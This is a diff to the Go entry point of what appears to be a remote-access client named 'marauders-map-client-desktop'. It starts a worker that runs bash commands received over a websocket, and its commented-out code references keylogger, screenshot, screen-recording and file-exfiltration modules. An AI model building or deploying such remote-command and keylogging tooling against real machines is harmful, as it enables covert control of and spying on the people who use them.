@@ -1,6 +1,7 @@
 package main
 
 import (
+	"log"
 	"marauders-map-client-desktop/internal"
 	"time"
 )
@@ -22,6 +23,9 @@ func main() {
 	wsc.Connect()
 	defer wsc.Disconnect()
 
+	// for {
+	// }
+
 	// Workers services
 	bashWorker := internal.NewBashWorker(wsc)
 	bashWorker.Start()
@@ -35,7 +39,8 @@ func main() {
 	go func() {
 		for {
 			time.Sleep(3 * time.Second)
-			wsc.Send("/app/marauder/bash/req", []byte("{\"marauder_id\":\"123\", \"command\":\"ls\"}"))
+			log.Println("Sending bash request")
+			wsc.Send("/app/marauder/bash/req", []byte("{\"marauder_id\":\"5ed32f8ce1bb8b3a7c53c37a\", \"command\":\"ls\"}"))
 		}
 	}()
 
@@ -49,7 +54,6 @@ func main() {
 	// respondServerCmd := internal.NewRespondServerCommand(wsc)
 
 	// subject := &internal.Subject{}
-	// subject.AddListener(internal.NewBashExecutorObserver(respondServerCmd))
 	// subject.AddListener(internal.NewKeyloggerCmdObserver())
 	// subject.AddListener(internal.NewScreenshotCmdObserver(screenrecorder, sendFileCmd, respondServerCmd))
 	// subject.AddListener(internal.NewFileCmdObserver(sendFileCmd, watchtower, respondServerCmd))
